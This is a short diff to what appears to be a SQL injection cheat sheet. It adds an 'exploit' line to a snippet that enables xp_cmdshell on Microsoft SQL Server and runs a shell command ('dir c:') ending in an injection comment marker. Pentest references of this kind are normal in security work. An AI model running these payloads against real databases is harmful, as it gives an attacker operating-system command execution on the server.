@@ -231,12 +231,13 @@ SQL Server Reading:
 BULK INSERT
 {% endhighlight %}
 
-> **MSSQL Enable xp_cmdshell**
+> **MSSQL Enable xp_cmdshell and exploit**
 
 {% highlight sql %}
 EXEC sp_configure 'show advanced options', 1;
 RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1;
+exec master..xp_cmdshell 'dir c:'; --
 RECONFIGURE;
 
 {% endhighlight %}
